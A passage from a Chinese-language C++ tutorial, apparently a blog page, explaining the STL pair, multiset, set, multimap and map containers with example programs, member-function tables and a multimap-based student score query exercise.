class="string">&quot;,&quot;</span> &lt;&lt; p4.second &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出  200,hello</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pair 模板中的第三个构造函数是函数模板，参数必须是一个 pair 模板类对象的引用。程序中第 9 行的 p3 就是用这个构造函数初始化的。</p>
<h4 id="C-multiset，STL-multiset详解"><a href="#C-multiset，STL-multiset详解" class="headerlink" title="C++ multiset，STL multiset详解"></a>C++ multiset，STL multiset详解</h4><p>multiset 是关联容器的一种，是排序好的集合（元素已经进行了排序），并且允许有相同的元素。</p>
<p>不能直接修改 multiset 容器中元素的值。因为元素被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。因此，如果要修改 multiset 容器中某个元素的值，正确的做法是先删除该元素，再插入新元素。</p>
<p>使用 multiset 必须包含头文件 <set>。multiset 类模板的定义如下：</set></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">B</span> = <span class="title">allocator</span>&lt;Key&gt; &gt; <span class="title">class</span> <span class="title">multiset</span> &#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>该模板有三个类型参数：Key、Pred 和 B。类型参数可以有默认值，默认值就是某种类型。例如，Pred 类型参数的默认值就是 less<Key> 类型，B 的默认值就是 allocator<Key> 类型。第三个类型参数极少用到，一般都用默认值，因此这里不做介绍。</Key></Key></p>
<p>第一个类型参数说明 multiset 容器中的每个元素都是 Key 类型的。第二个类型参数 Pred 用于指明容器中元素的排序规则，在被实例化后，Pred 可以是函数对象类，也可以是函数<a href="http://c.biancheng.net/c/80/">指针</a>类型。</p>
<p>multiset 内部在排序时定义了一个变量<code>Pred op</code>，根据表达式<code>op(x, y)</code>来比较两个元素 x、y 的大小。该表达式的值为 true，则说明 x 比 y 小。Pred 的默认值是 less<Key>，less 是 <a href="http://c.biancheng.net/stl/">STL</a> 中的函数对象类模板，其定义如下：</Key></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;class_Tp&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">less</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> _Tp &amp;__x, <span class="keyword">const</span> _Tp &amp;__y)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> __x &lt; __y; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这说明，在默认情况下，multiset 容器中的元素是用<code>&lt;</code>运算符比较大小的。例如，假设 A 是一个类的名字，可以定义一个如下的容器对象：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">multiset</span> &lt;A&gt; s;</span><br></pre></td></tr></table></figure>

<p>由于 multiset 的类型参数可以使用默认值，因此上面的语句等价于：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">multiset</span> &lt; <span class="keyword">int</span>, less&lt;A&gt;, allocator&lt;A&gt; &gt; s;</span><br></pre></td></tr></table></figure>

<p>模板类 multiset &lt; A, less<A>, allocator<A> &gt; 的 insert 成员函数可以用来插入一个元素。 插入过程中需要进行元素之间的比较，可以认为 insert 成员函数中定义了一个变量 less <A> op，用 op(x, y) 来比较元素 x、y 的大小。归根到底，还是用<code>&lt;</code>运算符比较 x、y 的大小。 因此，<code>&lt;</code>运算符必须经过适当重载，才可以向 multiset <A>容器中插人元素。</A></A></A></A></p>
<p>下面的程序 会编译出错：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">multiset</span> &lt;A&gt; a;</span><br><span class="line">    a.insert( A() );  <span class="comment">//编译出错，因为不能用“&lt;”运算符比较两个A对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>multiset 常用的成员函数如表 1 所示。有的成员函数有不止一个版本，这里不一一 列出。</p>
<table>
<thead>
<tr>
<th>成员函数或成员函数模板</th>
<th>作  用</th>
</tr>
</thead>
<tbody><tr>
<td>iterator find (const T &amp; val);</td>
<td>在容器中查找值为 val 的元素，返回其迭代器。如果找不到，返 回 end()</td>
</tr>
<tr>
<td>iterator insert( const T &amp; val);</td>
<td>将 val 插入容器中并返回其迭代器</td>
</tr>
<tr>
<td>void insert(iterator first, iterator last);</td>
<td>将区间 [first, last) 中的元素插人容器</td>
</tr>
<tr>
<td>int count( const T &amp; val);</td>
<td>统计有多少个元素的值和 val 相等</td>
</tr>
<tr>
<td>iterator lower_bound( const T &amp; val);</td>
<td>查找一个最大的位置 it，使得 [begin(), it) 中所有的元素者比 val 小</td>
</tr>
<tr>
<td>iterator upper_bound( const T &amp; val);</td>
<td>查找一个最小的位置 it，使得 [it, end()) 中所有的元素都比 val 大</td>
</tr>
<tr>
<td>pair &lt;iterator, iterator &gt; equal_range (const T &amp; val);</td>
<td>同时求得 lower_bound 和 upper_bound</td>
</tr>
<tr>
<td>iterator erase(iterator it);</td>
<td>删除 it 指向的元素，返回其后面的元素的迭代器（Visual Studio 2010 中如此，但是在 <a href="http://c.biancheng.net/cplus/">C++</a> 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
<tr>
<td>iterator erase(iterator first, iterator last);</td>
<td>删除区间 [first, last)，返回 last（Visual Studio 2010 中如此，但是在 C++ 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
</tbody></table>
<p>multiset 及 set 中的 find 和 count 并不是用<code>==</code>运算符比较元素是否和待查找的值相等的。它们进行比较的原则是：如果<code>x比y小</code>和<code>y比x小</code>同时为假，就认为 x 和 y 相等。</p>
<p>下面通过一个例子说明 multiset 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;  //使用multiset须包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">Print</span>(<span class="title">T</span> <span class="title">first</span>, <span class="title">T</span> <span class="title">last</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">for</span> (; first != last; ++first)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    A(<span class="keyword">int</span> n_) &#123; n = n_; &#125;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span><br><span class="line">    &#123; <span class="keyword">return</span> a1.n &lt; a2.n; &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp; o, <span class="keyword">const</span> A &amp; a2)</span><br><span class="line">    &#123; o &lt;&lt; a2.n; <span class="keyword">return</span> o; &#125;</span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLess</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLess</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span> <span class="params">(<span class="keyword">const</span> A &amp; a1, <span class="keyword">const</span> A &amp; a2)</span>  <span class="comment">//按个位数比较大小</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> (a1.n % <span class="number">10</span>) &lt; (a2.n % <span class="number">10</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">multiset</span> &lt;A&gt; MSET1;  <span class="comment">//MSET1 用“&lt;”运算符比较大小</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">multiset</span> &lt;A, MyLess&gt; MSET2;  <span class="comment">//MSET2 用 MyLess::operator() 比较大小</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">6</span>;</span><br><span class="line">    A a[SIZE] = &#123; <span class="number">4</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">40</span> &#125;;</span><br><span class="line">    MSET1 m1;</span><br><span class="line">    m1.insert(a, a + SIZE);</span><br><span class="line">    m1.insert(<span class="number">22</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1)&quot;</span> &lt;&lt; m1.count(<span class="number">22</span>) &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 1)2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2)&quot;</span>; Print(m1.begin(), m1.end());  <span class="comment">//输出 2)4 8 19 22 22 33 40</span></span><br><span class="line">    MSET1::iterator pp = m1.find(<span class="number">19</span>);</span><br><span class="line">    <span class="keyword">if</span> (pp != m1.end())  <span class="comment">//条件为真说明找到</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;found&quot;</span> &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//本行会被执行，输出 found</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3)&quot;</span>; <span class="built_in">cout</span> &lt;&lt; *m1.lower_bound(<span class="number">22</span>)</span><br><span class="line">        &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; *m1.upper_bound(<span class="number">22</span>) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 3)22,33</span></span><br><span class="line">    pp = m1.erase(m1.lower_bound(<span class="number">22</span>), m1.upper_bound(<span class="number">22</span>));</span><br><span class="line">    <span class="comment">//pp指向被删元素的下一个元素</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4)&quot;</span>; Print(m1.begin(), m1.end());  <span class="comment">//输出 4)4 8 19 33 40</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5)&quot;</span>; <span class="built_in">cout</span> &lt;&lt; *pp &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 5)33</span></span><br><span class="line">    MSET2 m2;  <span class="comment">//m2中的元素按n的个位数从小到大排序</span></span><br><span class="line">    m2.insert(a, a + SIZE);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6)&quot;</span>; Print(m2.begin(), m2.end());  <span class="comment">//输出 6)40 22 33 4 8 19</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第 30 行，MSET2 类的排序规则和 MSET1 不同。MSET2 用 MyLess 定义排序规则，即 n 的个位数小的元素排在前面。</p>
<p>第 43、44 行，lower_bound 返回的迭代器指向第一个 22，upper_bound 返回的迭代器指向 33。</p>
<p>第 45 行，删除所有值为 22 的元素。erase 成员函数删除一个元素后，返回下一个元素的迭代器应该是很合理的，但是 C++ 标准委员会认为，返回下一个元素的迭代器也是需要时间开销的，如果程序员不想要这个返回值，那么这个开销就是浪费的——因此在遵循 C++ 标准的 Dev C++ 中，本行无法编译通过。但是微软公司认为应该对这一点做出改进，因此 Visual Studio 2010 将 erase 成员函数处理成返回被删元素下一个元素的迭代器。</p>
<p>不论在哪种编译器中，用 erase 成员函数删除迭代器 i 指向的元素后，迭代器 i 即告失效， 此时不能指望 ++i 后 i 会指向被删除元素的下一个元素；相反，++i 可能立即导致出错。如果想要得到被删除元素后面那个元素的迭代器，可以在删除前获取其迭代器并保存起来（这同样适用于 set、map、multimap 的 erase 成员函数）。事实上，如果得到了某关联容器的迭代器，则该迭代器并不会因为容器中元素的插入以及其他元素的删除而失效。只要该迭代器指向的元素没有被删除，就可以一直使用它。</p>
<h4 id="C-set，STL-set详解"><a href="#C-set，STL-set详解" class="headerlink" title="C++ set，STL set详解"></a>C++ set，STL set详解</h4><p>set 是关联容器的一种，是排序好的集合（元素已经进行了排序）。set 和 multiset 类似，它和 multiset 的差别在于 set 中不能有重复的元素。multiset 的成员函数 set 中也都有。</p>
<p>不能直接修改 set 容器中元素的值。因为元素被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。因此，如果要修改 set 容器中某个元素的值，正确的做法是先删除该元素，再插入新元素。</p>
<p>使用 set 必须包含头文件 <set>。set 的定义如下：</set></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">A</span> = <span class="title">allocator</span>&lt;Key&gt; &gt; <span class="title">class</span> <span class="title">set</span> &#123;</span>...&#125;</span><br></pre></td></tr></table></figure>


<p>由于不能有重复元素，所以 set 中插入单个元素的 insert 成员函数与 multiset 中的有所不同，其原型如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">pair&lt;iterator, bool&gt; insert(const T &amp; val);</span><br></pre></td></tr></table></figure>

<p>如果 set 的 insert 成员函数的返回值是 pair 模板类对象 x，如果 x.second 为 true，则说明插入成功，此时 x.first 就是指向被插入元素的迭代器；如果 x.second 为 false，则说明要插入的元素已在容器中，此时 x.first 就是指向原有那个元素的迭代器。</p>
<p>关联容器的 equal_range 成员函数的返回值也是 pair 模板类对象，其原型如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">pair&lt;iterator, iterator&gt; equal_range(const T &amp; val);</span><br></pre></td></tr></table></figure>

<p>返回值对象中的 first 就是 lower_bound 的值，second 就是 upper_bound 的值。</p>
<p>下面的程序演示了 set 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;  //使用set须包含此文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator IT;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123; <span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span> &#125;;</span><br><span class="line">    <span class="function"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; <span class="title">st</span><span class="params">(a,a+<span class="number">5</span>)</span></span>;    <span class="comment">// st里是 1 2 3 4 6</span></span><br><span class="line">    <span class="built_in">pair</span>&lt; IT,<span class="keyword">bool</span>&gt; result;</span><br><span class="line">    result = st.insert(<span class="number">5</span>); <span class="comment">// st变成  1 2 3 4 5 6</span></span><br><span class="line">    <span class="keyword">if</span>(result.second)    <span class="comment">//插入成功则输出被插入元素</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * result.first  &lt;&lt; <span class="string">&quot; inserted&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出: 5 inserted</span></span><br><span class="line">    <span class="keyword">if</span>(st.insert(<span class="number">5</span>).second)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * result.first  &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * result.first &lt;&lt; <span class="string">&quot; already exists&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 5 already exists</span></span><br><span class="line">    <span class="built_in">pair</span>&lt;IT,IT&gt; bounds = st.equal_range(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; * bounds.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; * bounds.second ;  <span class="comment">//输出：4,5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果是：<br>5 inserted<br>5 already exists<br>4,5</p>
<h4 id="C-multimap，STL-multimap详解"><a href="#C-multimap，STL-multimap详解" class="headerlink" title="C++ multimap，STL multimap详解"></a>C++ multimap，STL multimap详解</h4><p>multimap 是关联容器的一种，multimap 的每个元素都分为关键字和值两部分，容器中的元素是按关键字排序的，并且允许有多个元素的关键字相同。</p>
<p>注意，不能直接修改 multimap 容器中的关键字。因为 multimap 中的元素是按照关键字排序的，当关键字被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。</p>
<p>使用 multimap 必须包含头文件 map。multimap 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">A</span> = <span class="title">allocator</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">multimap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">typedef</span> <span class="built_in">pair</span> &lt;<span class="keyword">const</span> Key, T&gt; value_type;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>multimap 中的元素都是 pair 模板类的对象。元素的 first 成员变量也叫“关键字”，second 成员变量也叫“值”。multimap 容器中的元素是按关键字从小到大排序的。默认情况下，元素的关键之间用 less <Key> 比较大小，也就是用<code>&lt;</code>运算符比较大小。multimap 允许多个元素的关键字相同。</Key></p>
<p>multimap 中的 value_type 实际上就表示容器中元素的类型。<a href="http://c.biancheng.net/cplus/">C++</a> 允许在类的内部定义类型。</p>
<p>multimap 的成员函数（未列出每个函数的所有版本）如表 1 所示。</p>
<table>
<thead>
<tr>
<th>成员函数或成员函数模板</th>
<th>作  用</th>
</tr>
</thead>
<tbody><tr>
<td>iterator find( const Key &amp; val);</td>
<td>在容器中查找关键字等于 val 的元素，返回其迭代器；如果找不到，返回 end()</td>
</tr>
<tr>
<td>iterator insert (pair &lt;Key, T&gt; const &amp;p);</td>
<td>将 pair 对象 p 插入容器中并返回其迭代器</td>
</tr>
<tr>
<td>void insert(iterator first, iterator last);</td>
<td>将区间 [first, last) 插入容器</td>
</tr>
<tr>
<td>int count( const Key &amp; val);</td>
<td>统计有多少个元素的关键字和 val 相等</td>
</tr>
<tr>
<td>iterator lower_bound( const Key &amp; val);</td>
<td>查找一个最大的位置 it，使得 [begin( ), it) 中所有的元素的关键字都比 val 小</td>
</tr>
<tr>
<td>iterator upper_bound(const Key &amp; val);</td>
<td>查找一个最小的位置 it，使得 [it, end()) 中所有的元素的关键字都比 val 大</td>
</tr>
<tr>
<td>pair &lt; iterator, iterator &gt; equal_range (const Key &amp; val);</td>
<td>同时求得 lower_bound 和 upper_bound</td>
</tr>
<tr>
<td>iterator erase(iterator it);</td>
<td>删除 it 指向的元素，返回其后面的元素的迭代器（Visual Studio 2010 中如此，但是在 C++ 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
<tr>
<td>iterator erase(iterator first, iterator last);</td>
<td>删除区间 [first, last)，返回 last（Visual Studio 2010 中如此，但是在 C++ 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
</tbody></table>
<p>multimap 及 map 中的 find 和 count 不用<code>==</code>运算符比较两个关键字是否相等。如果<code>x比y小</code>和<code>y比x小</code>同时为假，就认为 x 和 y 相等。</p>
<p>例题：一个学生成绩录入和查询系统接受以下两种输入：</p>
<ol>
<li>Add name id score</li>
<li>Query score</li>
</ol>
<p>name 是一个字符串，其中不包含空格，表示学生姓名。id 是一个整数，表示学号。score 是一个整数，表示分数。学号不会重复，分数和姓名都可能重复。</p>
<p>两种输入交替出现。</p>
<ul>
<li>第一种输入表示要添加一个学生的信息，碰到这种输入，就记下学生的姓名、id 和分数。</li>
<li>第二种输入表示要查询分数为 score 的学生的信息，碰到这种输入，就输出已有记录中分数比查询分数低的最高分获得者的姓名、学号和分数。如果有多个学生满足条件，则输出学号最大的学生的信息。如果找不到满足条件的学生，则输出“Nobody”。</li>
</ul>
<p>输入样例：<br>Add Jack 12 78<br>Query 78<br>Query 81<br>Add Percy 9 81<br>Add Marry 8 81<br>Query 82<br>Add Tom 11 79<br>Query 80<br>Query 81</p>
<p>输出结果样例：<br>Nobody<br>Jack 12 78<br>Percy 9 81<br>Tom 11 79<br>Tom 11 79</p>
<p>此题如果用 vector 存放所有学生的信息，然后进行顺序查找的话，在学生数量很大和查询很多的情况下非常费时，因为顺序查找的时间复杂度是 O(n)。将 vector 排序后再查找也不行，因为会不断插入新元素，每次插入新元素就要进行元素的移动，而这一步骤的时间复杂度是O(n)，这会导致效率低下。</p>
<p>下面程序的思路是用 multimap 存放学生信息，使学生信息按照分数排序。</p>
<p>要添加学生时，就用 insert 成员函数插入学生记录，这步操作的时间复杂度是 O(log(n))。</p>
<p>输入一个要查询的分数 score 时，就用 lower_bound 求得该分数对应的下界——迭代器 p（这一步的时间复杂度是 O(log(n)）。 *p 这个元素的分数是大于或等于 score 的，往前再找一个元素，其分数就是低于 score 的最高分了。继续往前遍历所有等于该分数的元素，找出 id 最大的元素输出即可。</p>
<p>解题程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;  //使用multimap需要包含此头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CStudent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CInfo</span>  //类的内部还可以定义类</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">int</span> id;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    CInfo info;  <span class="comment">//学生的其他信息</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">multimap</span> &lt;<span class="keyword">int</span>, CStudent::CInfo&gt; MAP_STD;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    MAP_STD mp;</span><br><span class="line">    CStudent st;</span><br><span class="line">    <span class="built_in">string</span> cmd;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; cmd) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="string">&quot;Add&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; st.info.name &gt;&gt; st.info.id &gt;&gt; st.score;</span><br><span class="line">            mp.insert(MAP_STD::value_type(st.score, st.info));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="string">&quot;Query&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> score;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line">            MAP_STD::iterator p = mp.lower_bound(score);</span><br><span class="line">            <span class="keyword">if</span> (p != mp.begin()) &#123;</span><br><span class="line">                --p;</span><br><span class="line">                score = p-&gt;first;  <span class="comment">//比要查询分数低的最高分</span></span><br><span class="line">                MAP_STD::iterator maxp = p;</span><br><span class="line">                <span class="keyword">int</span> maxId = p-&gt;second.id;</span><br><span class="line">                <span class="keyword">for</span> (; p != mp.begin() &amp;&amp; p-&gt;first == score; --p) &#123;</span><br><span class="line">                    <span class="comment">//遍历所有成绩和score相等的学生</span></span><br><span class="line">                    <span class="keyword">if</span> (p-&gt;second.id &gt; maxId) &#123;</span><br><span class="line">                        maxp = p;</span><br><span class="line">                        maxId = p-&gt;second.id;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (p-&gt;first == score) &#123; <span class="comment">//如果上面的循环因为 p == mp.begin()</span></span><br><span class="line">                                         <span class="comment">//而终止，则p指向的元素还要处理</span></span><br><span class="line">                    <span class="keyword">if</span> (p-&gt;second.id &gt; maxId) &#123;</span><br><span class="line">                        maxp = p;</span><br><span class="line">                        maxId = p-&gt;second.id;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; maxp-&gt;second.name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; maxp-&gt;second.id &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">                    &lt;&lt; maxp-&gt;first &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>  <span class="comment">//lower_bound 的结果就是 begin，说明没有分数比查询分数低</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Nobody&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>multimap 容器中的元素必须是 pair 类模板对象。本题需要用 multimap 来存放学生信息，然而学生信息由三部分组成：姓名、学号、分数，解决的办法就是将用于排序的 score 作为一个成员变量，而且把其他部分一起作为一个 CInfo 对象，这样，第 16 行实例化出来的类 multimap &lt;int, CStudent::CInfo&gt; 中的元素的类型就会是如下 pair 模板类：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pair</span> &lt;int, CStudent::CInfo&gt;</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> first; <span class="comment">//对应于CStudent::score</span></span><br><span class="line">  CStudent::CInfo second; <span class="comment">//对应于 CStudent::info</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>第 26 行如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mp.insert( MAP_STD::value_type(st.score, st.info) );</span><br></pre></td></tr></table></figure>

<p>参看 multimap 的定义，MAP_STD::value_type 就是容器中元素的类型，该类型是 pair &lt;int, CStudent::CInfo&gt;。类型名后面跟构造函数的参数表就代表一个对象。因此，此条语句生成了一个 pair &lt;int, CStudent::CInfo&gt; 对象并将其插入 multimap 容器中。该对象内部存放的信息和 st 相同，first 对应于 st.score，second 对应于 st.info。</p>
<p>第 31 行，lower_bound 的返回结果 p 满足以下条件：[begin(), p) 中的分数都比查询分数低，但是 <em>p 的分数不比查询分数低。所以执行 –p 操作之后，</em>p 的分数就是低于查询分数的最高分了。</p>
<h4 id="C-map，STL-map详解"><a href="#C-map，STL-map详解" class="headerlink" title="C++ map，STL map详解"></a>C++ map，STL map详解</h4><p>map 是关联容器的一种，map 的每个元素都分为关键字和值两部分，容器中的元素是按关键字排序的，并且不允许有多个元素的关键字相同。</p>
<p>注意，不能直接修改 map 容器中的关键字。因为 map 中的元素是按照关键字排序的，当关键字被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。</p>
